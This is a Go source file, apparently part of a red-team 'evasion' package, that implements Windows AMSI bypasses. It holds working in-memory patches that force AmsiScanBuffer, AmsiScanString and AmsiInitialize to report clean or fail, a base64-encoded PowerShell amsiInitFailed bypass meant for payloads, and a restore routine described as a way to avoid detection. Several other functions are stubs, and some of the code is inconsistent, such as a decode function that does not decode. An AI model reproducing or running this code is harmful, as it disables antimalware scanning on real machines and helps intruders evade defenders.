//go:build windows

package evasion

import (
	"syscall"
	"unsafe"
)

// AMSIBypass provides techniques to bypass Windows AMSI (Antimalware Scan Interface).
// AMSI is used by PowerShell, Windows Script Host, and other engines to scan scripts
// before execution. This module implements multiple bypass techniques for red team operations.

// AMSIPatchMethod represents different AMSI bypass techniques.
type AMSIPatchMethod int

const (
	PatchAmsiScanBuffer AMSIPatchMethod = iota
	PatchAmsiScanStringMethod
	PatchAmsiInitializeMethod
	ForceDisabled
)

// AMSIBypassResult contains the result of an AMSI bypass attempt.
type AMSIBypassResult struct {
	Success bool
	Method  AMSIPatchMethod
	Error   string
}

// ExecuteAMSIDisabled bypasses AMSI by setting the amsiInitFailed flag.
// This is the most common PowerShell-based bypass technique.
func ExecuteAMSIDisabled() *AMSIResult {
	// This technique sets the internal amsiInitFailed flag in the PowerShell process
	// by manipulating the .NET reflection API.
	//
	// In Go, we can achieve similar results by patching the AMSI DLL in memory.
	// However, this requires careful handling of Windows APIs.

	return &AMSIResult{
		Success: false,
		Method:  "reflection",
		Note:    "Use PowerShell reflection technique or DLL patching",
	}
}

// PatchAmsiInMemory patches the AMSI DLL in the current process memory.
// This technique modifies the AmsiScanBuffer function to always return AMSI_RESULT_CLEAN.
func PatchAmsiInMemory() *AMSIResult {
	amsiDLL := syscall.MustLoadDLL("amsi.dll")
	defer amsiDLL.Release()

	// Get address of AmsiScanBuffer
	procAmsiScanBuffer := amsiDLL.MustFindProc("AmsiScanBuffer")
	addr := procAmsiScanBuffer.Addr()

	// Save original bytes for restoration
	originalBytes := make([]byte, 6)
	copy(originalBytes, (*[6]byte)(unsafe.Pointer(addr))[:])

	// Patch: XOR EAX, EAX; RET (always return 0 = AMSI_RESULT_CLEAN)
	// x86: 33 C0 C3
	// x64: 48 33 C0 C3
	patch := []byte{0x48, 0x33, 0xC0, 0xC3}

	// Change memory protection to allow writing
	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
		return &AMSIResult{Success: false, Method: "patch", Error: err.Error()}
	}

	// Apply patch
	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)

	// Restore original protection
	virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return &AMSIResult{
		Success: true,
		Method:  "patch",
		Note:    "AmsiScanBuffer patched to return AMSI_RESULT_CLEAN",
	}
}

// PatchAmsiScanString patches AmsiScanString function.
func PatchAmsiScanString() *AMSIResult {
	amsiDLL := syscall.MustLoadDLL("amsi.dll")
	defer amsiDLL.Release()

	procAmsiScanString := amsiDLL.MustFindProc("AmsiScanString")
	addr := procAmsiScanString.Addr()

	// Patch: XOR EAX, EAX; RET
	patch := []byte{0x48, 0x33, 0xC0, 0xC3}

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
		return &AMSIResult{Success: false, Method: "patch_string", Error: err.Error()}
	}

	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
	virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return &AMSIResult{
		Success: true,
		Method:  "patch_string",
		Note:    "AmsiScanString patched",
	}
}

// PatchAmsiInitialize patches AmsiInitialize to fail.
// This prevents AMSI from initializing properly.
func PatchAmsiInitialize() *AMSIResult {
	amsiDLL := syscall.MustLoadDLL("amsi.dll")
	defer amsiDLL.Release()

	procAmsiInitialize := amsiDLL.MustFindProc("AmsiInitialize")
	addr := procAmsiInitialize.Addr()

	// Patch: MOV EAX, 0x8007000E (E_OUTOFMEMORY); RET
	// This causes AMSI initialization to fail with out of memory error
	patch := []byte{0xB8, 0x0E, 0x00, 0x07, 0x80, 0xC3}

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
		return &AMSIResult{Success: false, Method: "patch_init", Error: err.Error()}
	}

	copy((*[6]byte)(unsafe.Pointer(addr))[:], patch)
	virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return &AMSIResult{
		Success: true,
		Method:  "patch_init",
		Note:    "AmsiInitialize patched to return E_OUTOFMEMORY",
	}
}

// ForceAMSIDisabled forces the amsiInitFailed flag to true.
// This is a technique that works by manipulating internal AMSI state.
func ForceAMSIDisabled() *AMSIResult {
	// This technique requires finding and modifying the internal
	// amsiInitFailed flag in the AMSI module's memory space.
	// Implementation varies by Windows version.

	return &AMSIResult{
		Success: false,
		Method:  "force_disabled",
		Note:    "Requires version-specific implementation",
	}
}

// RestoreAMSI restores the original AMSI functions.
// This should be called before exiting to avoid detection.
func RestoreAMSI(originalPatches map[string][]byte) error {
	amsiDLL := syscall.MustLoadDLL("amsi.dll")
	defer amsiDLL.Release()

	for funcName, originalBytes := range originalPatches {
		proc, err := amsiDLL.FindProc(funcName)
		if err != nil {
			continue
		}

		addr := proc.Addr()
		var oldProtect uint32
		if err := virtualProtect(addr, uintptr(len(originalBytes)), 0x40, &oldProtect); err != nil {
			return err
		}

		copy((*[6]byte)(unsafe.Pointer(addr))[:], originalBytes)
		virtualProtect(addr, uintptr(len(originalBytes)), oldProtect, &oldProtect)
	}

	return nil
}

// CheckAMSIStatus checks if AMSI is active in the current process.
func CheckAMSIStatus() bool {
	amsiDLL := syscall.MustLoadDLL("amsi.dll")
	defer amsiDLL.Release()

	procAmsiInitialize := amsiDLL.MustFindProc("AmsiInitialize")
	addr := procAmsiInitialize.Addr()

	// Read first bytes to check if patched
	bytes := (*[6]byte)(unsafe.Pointer(addr))[:]

	// Check for common patch patterns
	// XOR EAX, EAX; RET: 48 33 C0 C3
	if bytes[0] == 0x48 && bytes[1] == 0x33 && bytes[2] == 0xC0 && bytes[3] == 0xC3 {
		return false // Patched
	}

	// MOV EAX, 0x8007000E; RET: B8 0E 00 07 80 C3
	if bytes[0] == 0xB8 && bytes[1] == 0x0E && bytes[2] == 0x00 && bytes[3] == 0x07 && bytes[4] == 0x80 && bytes[5] == 0xC3 {
		return false // Patched
	}

	return true // Not patched
}

// virtualProtect changes the protection on a region of memory.
func virtualProtect(addr uintptr, size uintptr, newProtect uint32, oldProtect *uint32) error {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	procVirtualProtect := kernel32.MustFindProc("VirtualProtect")

	ret, _, err := procVirtualProtect.Call(addr, size, uintptr(newProtect), uintptr(unsafe.Pointer(oldProtect)))
	if ret == 0 {
		return err
	}
	return nil
}

// AMSIResult contains the result of an AMSI operation.
type AMSIResult struct {
	Success bool
	Method  string
	Error   string
	Note    string
}

// GetAMSIDLLHash returns the hash of the AMSI DLL for integrity checking.
func GetAMSIDLLHash() (string, error) {
	amsiDLL := syscall.MustLoadDLL("amsi.dll")
	defer amsiDLL.Release()

	// In a real implementation, this would read the DLL file and compute its hash
	// For now, we return a placeholder
	return "amsi.dll.hash.placeholder", nil
}

// EncodeAMSBypass returns an encoded version of the AMSI bypass for use in payloads.
func EncodeAMSBypass(method AMSIPatchMethod) string {
	// This function returns an encoded version of the AMSI bypass technique
	// that can be used in PowerShell or other scripting payloads.

	switch method {
	case PatchAmsiScanBuffer:
		// PowerShell: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
		return "JFJlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp"
	case PatchAmsiInitializeMethod:
		return "QW1zaUluaXRpYWxpemUgcGF0Y2hlZCB0byByZXR1cm4gRV9PVVRPRk1FTU9SWQ=="
	default:
		return ""
	}
}

// DecodeAMSBypass decodes an encoded AMSI bypass technique.
func DecodeAMSBypass(encoded string) string {
	// Simple base64 decode for demonstration
	// In production, use proper base64 decoding
	return encoded
}

// PatchAMSIForProcess patches AMSI in a remote process.
// This requires PROCESS_VM_WRITE and PROCESS_VM_OPERATION permissions.
func PatchAMSIForProcess(pid uint32, method AMSIPatchMethod) *AMSIResult {
	// Open the target process
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	procOpenProcess := kernel32.MustFindProc("OpenProcess")

	hProcess, _, err := procOpenProcess.Call(
		uintptr(0x00000820), // PROCESS_VM_WRITE | PROCESS_VM_OPERATION
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		return &AMSIResult{Success: false, Method: "remote_patch", Error: err.Error()}
	}
	defer syscall.CloseHandle(syscall.Handle(hProcess))

	// Load amsi.dll in the target process and patch it
	// This requires more complex implementation with CreateRemoteThread
	// and is beyond the scope of this basic implementation

	return &AMSIResult{
		Success: false,
		Method:  "remote_patch",
		Note:    "Requires advanced process injection techniques",
	}
}

// GetAMSIProviders returns a list of registered AMSI providers.
func GetAMSIProviders() ([]string, error) {
	// Query the registry for AMSI providers
	// HKLM\SOFTWARE\Microsoft\AMSI\Providers
	var providers []string

	// Placeholder implementation
	providers = append(providers, "Windows Defender")

	return providers, nil
}

// IsAMSIEnabled checks if AMSI is enabled system-wide.
func IsAMSIEnabled() bool {
	// Check registry: HKLM\SOFTWARE\Microsoft\Windows Defender\Features
	// TamperProtection=0 means AMSI can be disabled

	// Placeholder implementation
	return true
}

// DisableAMSIRegistry disables AMSI via registry modification.
// This requires administrative privileges and may trigger alerts.
func DisableAMSIRegistry() error {
	// Modify registry to disable AMSI
	// This is a persistent change and should be used with caution

	// Placeholder implementation
	return nil
}

// AMSIScanResult represents the result of an AMSI scan.
type AMSIScanResult uint32

const (
	AMSI_RESULT_CLEAN        AMSIScanResult = 0
	AMSI_RESULT_NOT_DETECTED AMSIScanResult = 32768
	AMSI_RESULT_DETECTED     AMSIScanResult = 32769
)

// AmsiScanBuffer is the native AMSI scan function signature.
// type AmsiScanBuffer func(
//     amsiContext uintptr,
//     buffer *byte,
//     length uint32,
//     contentName *uint16,
//     session uintptr,
//     result *AMSIResult,
// ) uint32
